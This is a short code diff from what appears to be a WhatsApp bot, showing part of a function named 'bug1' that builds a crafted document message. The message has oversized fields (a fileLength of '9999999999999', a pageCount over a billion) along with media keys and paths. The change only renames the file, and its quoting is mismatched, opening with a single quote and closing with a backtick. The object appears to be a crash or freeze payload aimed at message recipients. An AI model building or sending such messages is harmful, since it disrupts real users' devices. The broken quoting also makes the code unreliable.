@@ -112,7 +112,7 @@ async function bug1(message, client, participant) {
                                         fileLength: "9999999999999",
                                         pageCount: 1316134911,
                                         mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-                                        fileName: 'ᛢᛁᚱ ᚳᛜᚪᚾ`,
+                                        fileName: 'loft`,
                                         fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                         directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc",
                                         mediaKeyTimestamp: "1724474503",
